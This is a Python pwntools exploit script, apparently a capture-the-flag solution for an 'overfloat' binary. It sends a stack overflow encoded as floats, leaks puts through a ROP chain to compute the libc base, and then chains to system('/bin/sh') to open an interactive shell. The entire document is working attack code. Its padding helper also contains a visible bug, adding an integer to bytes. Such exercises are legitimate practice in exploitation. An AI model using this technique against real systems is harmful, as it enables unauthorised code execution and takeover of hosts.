from pwn import *
context.binary = './overfloat_patched'
elf = ELF('./overfloat_patched')
libc = ELF('./libc-2.27.so')
io = process('./overfloat_patched')
# io = gdb.debug('./overfloat_patched', '''
#     break main
#     break *0x00400a1e
#     c
# ''')
RET_ADDR_OFFSET = cyclic_find(0x6161616f)

def pack_float(chunk: bytes) -> bytes:
    if len(chunk) < 4: # pad with zeroes
        chunk += 4 - len(chunk)
    elif len(chunk) > 4:
        raise ValueError("Length of chunk > 4")
    return str(struct.unpack('<f', chunk)[0]).encode()

def send_payload(payload: bytes):
    for i in range(0, len(payload), 4):
        flt = pack_float(payload[i:i+4])
        # log.info(f"Sending float: {flt}")
        io.sendline(flt)
    io.sendline(b'done')

def leak_libc():
    rop = ROP(elf)
    rop.call(elf.symbols[b'puts'], [elf.got[b'puts']])
    rop.call(elf.symbols[b'main'])
    payload = flat({
        RET_ADDR_OFFSET : rop.build()
    })
    send_payload(payload)
    io.recvuntil(b"BON VOYAGE!\n")
    puts_address = unpack(io.recvn(6), 'all')
    log.info(f"Leaked puts address: 0x{puts_address:0x}")

    libc.address = puts_address - libc.symbols['puts']
    log.info(f"Set libc base address: 0x{libc.address:0x}")


leak_libc()

# ROP to pop a shell
rop = ROP([elf, libc])
rop.raw(0x0000000000400661) # ret; align stack
rop.call(libc.symbols[b'system'], [next(libc.search(b'/bin/sh'))])
payload = flat({
    RET_ADDR_OFFSET : rop.build()
})
send_payload(payload)
io.recvuntil(b'BON VOYAGE!\n')
log.success("Got Shell!")
io.interactive()
